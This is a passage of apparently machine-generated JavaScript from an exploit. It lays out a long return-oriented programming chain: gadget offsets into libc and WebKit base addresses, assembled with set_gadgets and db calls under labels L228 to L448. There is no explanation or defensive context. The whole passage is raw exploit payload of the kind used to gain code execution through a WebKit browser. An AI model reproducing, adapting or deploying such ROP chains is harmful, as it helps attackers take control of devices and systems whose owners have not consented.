libc_base+713278,
ropchain+75224,//L230
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+75256,//L232
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+75240,//L231
webkit_base+4687784,
libc_base+713278
]);
//L229:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L230:
db([0,0]);
set_gadget(libc_base+165442,);
//L231:
db([0,0]);
set_gadget(libc_base+768796,);
//L232:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+75368,//L233+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+75360,//L233
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L233:
db([0,0]);
set_gadgets([
ropchain+75384,//L233+24
ropchain+75400,//L228
libc_base+489696,//pop rsp
ropchain+75416,//L234
//L228:
libc_base+489696,//pop rsp
ropchain+86016,//L235
//L234:
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L236:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L238:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+75536,//L240
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+75552,//L241
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L240:
db([0,0]);
set_gadget(libc_base+772328,);
//L241:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+75696,//L244
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+75664,//L242
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+75680,//L243
webkit_base+4687784,
libc_base+165442
]);
//L242:
db([0,0]);
set_gadget(libc_base+772328,);
//L243:
db([0,0]);
set_gadget(libc_base+768796,);
//L244:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+75768,//L246
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L246:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+75824,//L248
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L248:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L249:
db([7,0]);// 0x7
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+75968,//L252
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L250:
db([4294967284,4294967295]);// -0xc
set_gadget(libc_base+772328,);
//L252:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+76056,//L254
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+76072,//L255
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L254:
db([0,0]);
set_gadget(libc_base+772328,);
//L255:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+76232,//L257
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+76264,//L259
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+76216,//L256
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+76248,//L258
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L256:
db([0,0]);
set_gadget(libc_base+165442,);
//L257:
db([0,0]);
set_gadget(libc_base+772328,);
//L258:
db([0,0]);
set_gadget(libc_base+768796,);
//L259:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+76392,//L261
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+76408,//L262
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+76376,//L260
webkit_base+4687784,
libc_base+165442
]);
//L260:
db([0,0]);
set_gadget(libc_base+772328,);
//L261:
db([0,0]);
set_gadget(libc_base+768796,);
//L262:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+76520,//L263
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+76536,//L264
webkit_base+4687784,
libc_base+772328
]);
//L263:
db([0,0]);
set_gadget(libc_base+768796,);
//L264:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+76624,//L266
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L266:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+76680,//L268
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L268:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+76808,//L269
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+76840,//L271
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+76824,//L270
webkit_base+4687784,
libc_base+165442
]);
//L269:
db([0,0]);
set_gadget(libc_base+772328,);
//L270:
db([0,0]);
set_gadget(libc_base+768796,);
//L271:
db([0,0]);
set_gadgets([
libc_base+229136,//mov al,[rdi]
libc_base+713278,
ropchain+77000,//L275
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+76952,//L272
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+76968,//L273
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L272:
db([0,0]);
set_gadget(libc_base+165442,);
//L273:
db([0,0]);
set_gadget(libc_base+772328,);
//L274:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L275:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+77056,//L277
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L277:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+77168,//L278
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+77200,//L280
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+77184,//L279
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L278:
db([0,0]);
set_gadget(libc_base+772328,);
//L279:
db([0,0]);
set_gadget(libc_base+768796,);
//L280:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+77360,//L284
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+77312,//L281
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+77328,//L282
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L281:
db([0,0]);
set_gadget(libc_base+165442,);
//L282:
db([0,0]);
set_gadget(libc_base+772328,);
//L283:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L284:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+77416,//L286
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L286:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+77528,//L287
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+77560,//L289
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+77544,//L288
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L287:
db([0,0]);
set_gadget(libc_base+772328,);
//L288:
db([0,0]);
set_gadget(libc_base+768796,);
//L289:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+77720,//L293
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+77672,//L290
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+77688,//L291
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L290:
db([0,0]);
set_gadget(libc_base+165442,);
//L291:
db([0,0]);
set_gadget(libc_base+772328,);
//L292:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L293:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+77776,//L295
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L295:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+77888,//L296
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+77920,//L298
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+77904,//L297
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L296:
db([0,0]);
set_gadget(libc_base+772328,);
//L297:
db([0,0]);
set_gadget(libc_base+768796,);
//L298:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+78000,//L299
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+78016,//L300
webkit_base+4687784,
libc_base+165442
]);
//L299:
db([0,0]);
set_gadget(libc_base+768796,);
//L300:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+78136,//L304
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+78120,//L303
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L301:
db([4294967283,4294967295]);// -0xd
set_gadget(libc_base+165442,);
//L303:
db([0,0]);
set_gadget(libc_base+772328,);
//L304:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L305:
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+78264,//L308
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+78280,//L309
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L308:
db([0,0]);
set_gadget(libc_base+772328,);
//L309:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+78424,//L312
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+78392,//L310
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+78408,//L311
webkit_base+4687784,
libc_base+165442
]);
//L310:
db([0,0]);
set_gadget(libc_base+772328,);
//L311:
db([0,0]);
set_gadget(libc_base+768796,);
//L312:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+78496,//L314
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L314:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+78552,//L316
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L316:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+78648,//L319
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L317:
db([4294967284,4294967295]);// -0xc
set_gadget(libc_base+772328,);
//L319:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+78736,//L321
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+78752,//L322
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L321:
db([0,0]);
set_gadget(libc_base+772328,);
//L322:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+78912,//L324
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+78944,//L326
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+78896,//L323
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+78928,//L325
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L323:
db([0,0]);
set_gadget(libc_base+165442,);
//L324:
db([0,0]);
set_gadget(libc_base+772328,);
//L325:
db([0,0]);
set_gadget(libc_base+768796,);
//L326:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+79072,//L328
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+79088,//L329
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+79056,//L327
webkit_base+4687784,
libc_base+165442
]);
//L327:
db([0,0]);
set_gadget(libc_base+772328,);
//L328:
db([0,0]);
set_gadget(libc_base+768796,);
//L329:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+79176,//L331
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L331:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+79232,//L333
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L333:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+79360,//L334
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+79392,//L336
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+79376,//L335
webkit_base+4687784,
libc_base+165442
]);
//L334:
db([0,0]);
set_gadget(libc_base+772328,);
//L335:
db([0,0]);
set_gadget(libc_base+768796,);
//L336:
db([0,0]);
set_gadgets([
libc_base+229136,//mov al,[rdi]
libc_base+713278,
ropchain+79552,//L340
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+79504,//L337
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+79520,//L338
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L337:
db([0,0]);
set_gadget(libc_base+165442,);
//L338:
db([0,0]);
set_gadget(libc_base+772328,);
//L339:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L340:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+79608,//L342
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L342:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+79720,//L343
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+79752,//L345
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+79736,//L344
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L343:
db([0,0]);
set_gadget(libc_base+772328,);
//L344:
db([0,0]);
set_gadget(libc_base+768796,);
//L345:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+79912,//L349
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+79864,//L346
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+79880,//L347
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L346:
db([0,0]);
set_gadget(libc_base+165442,);
//L347:
db([0,0]);
set_gadget(libc_base+772328,);
//L348:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L349:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+79968,//L351
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L351:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+80080,//L352
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+80112,//L354
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+80096,//L353
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L352:
db([0,0]);
set_gadget(libc_base+772328,);
//L353:
db([0,0]);
set_gadget(libc_base+768796,);
//L354:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+80272,//L358
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+80224,//L355
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+80240,//L356
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L355:
db([0,0]);
set_gadget(libc_base+165442,);
//L356:
db([0,0]);
set_gadget(libc_base+772328,);
//L357:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L358:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+80328,//L360
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L360:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+80440,//L361
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+80472,//L363
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+80456,//L362
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L361:
db([0,0]);
set_gadget(libc_base+772328,);
//L362:
db([0,0]);
set_gadget(libc_base+768796,);
//L363:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+80552,//L364
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+80568,//L365
webkit_base+4687784,
libc_base+165442
]);
//L364:
db([0,0]);
set_gadget(libc_base+768796,);
//L365:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+80728,//L369
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+80680,//L366
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+80696,//L367
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L366:
db([0,0]);
set_gadget(libc_base+165442,);
//L367:
db([0,0]);
set_gadget(libc_base+772328,);
//L368:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L369:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+80784,//L371
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L371:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+80896,//L372
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+80928,//L374
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+80912,//L373
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L372:
db([0,0]);
set_gadget(libc_base+772328,);
//L373:
db([0,0]);
set_gadget(libc_base+768796,);
//L374:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+81024,//L376
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+81008,//L375
webkit_base+4687784,
libc_base+165442
]);
//L375:
db([0,0]);
set_gadget(libc_base+768796,);
//L376:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+81120,//L379
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L377:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L379:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+81208,//L381
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+81224,//L382
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L381:
db([0,0]);
set_gadget(libc_base+772328,);
//L382:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+81368,//L385
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+81336,//L383
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+81352,//L384
webkit_base+4687784,
libc_base+165442
]);
//L383:
db([0,0]);
set_gadget(libc_base+772328,);
//L384:
db([0,0]);
set_gadget(libc_base+768796,);
//L385:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+81440,//L387
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L387:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+81496,//L389
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L389:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L390:
db([7,0]);// 0x7
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+81640,//L393
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L391:
db([4294967284,4294967295]);// -0xc
set_gadget(libc_base+772328,);
//L393:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+81728,//L395
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+81744,//L396
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L395:
db([0,0]);
set_gadget(libc_base+772328,);
//L396:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+81904,//L398
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+81936,//L400
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+81888,//L397
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+81920,//L399
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L397:
db([0,0]);
set_gadget(libc_base+165442,);
//L398:
db([0,0]);
set_gadget(libc_base+772328,);
//L399:
db([0,0]);
set_gadget(libc_base+768796,);
//L400:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+82064,//L402
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+82080,//L403
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+82048,//L401
webkit_base+4687784,
libc_base+165442
]);
//L401:
db([0,0]);
set_gadget(libc_base+772328,);
//L402:
db([0,0]);
set_gadget(libc_base+768796,);
//L403:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+82192,//L404
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+82208,//L405
webkit_base+4687784,
libc_base+772328
]);
//L404:
db([0,0]);
set_gadget(libc_base+768796,);
//L405:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+82296,//L407
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L407:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+82352,//L409
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L409:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+82424,//L411
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L411:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+82480,//L413
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L413:
db([0,0]);
set_gadgets([
webkit_base+887232,//mov [rax],cl
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+82584,//L416
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L414:
db([4294967283,4294967295]);// -0xd
set_gadget(libc_base+772328,);
//L416:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+82672,//L418
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+82688,//L419
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L418:
db([0,0]);
set_gadget(libc_base+772328,);
//L419:
db([0,0]);
set_gadgets([
libc_base+229136,//mov al,[rdi]
libc_base+713278,
ropchain+82848,//L423
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+82800,//L420
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+82816,//L421
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L420:
db([0,0]);
set_gadget(libc_base+165442,);
//L421:
db([0,0]);
set_gadget(libc_base+772328,);
//L422:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L423:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+82904,//L425
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L425:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+83016,//L426
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+83048,//L428
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+83032,//L427
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L426:
db([0,0]);
set_gadget(libc_base+772328,);
//L427:
db([0,0]);
set_gadget(libc_base+768796,);
//L428:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+83208,//L432
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+83160,//L429
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+83176,//L430
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L429:
db([0,0]);
set_gadget(libc_base+165442,);
//L430:
db([0,0]);
set_gadget(libc_base+772328,);
//L431:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L432:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+83264,//L434
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L434:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+83376,//L435
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+83408,//L437
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+83392,//L436
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L435:
db([0,0]);
set_gadget(libc_base+772328,);
//L436:
db([0,0]);
set_gadget(libc_base+768796,);
//L437:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+83488,//L438
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+83504,//L439
webkit_base+4687784,
libc_base+165442
]);
//L438:
db([0,0]);
set_gadget(libc_base+768796,);
//L439:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+83664,//L443
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+83616,//L440
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+83632,//L441
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L440:
db([0,0]);
set_gadget(libc_base+165442,);
//L441:
db([0,0]);
set_gadget(libc_base+772328,);
//L442:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L443:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+83720,//L445
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L445:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+83832,//L446
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+83864,//L448
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+83848,//L447
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L446:
db([0,0]);
set_gadget(libc_base+772328,);
//L447:
db([0,0]);
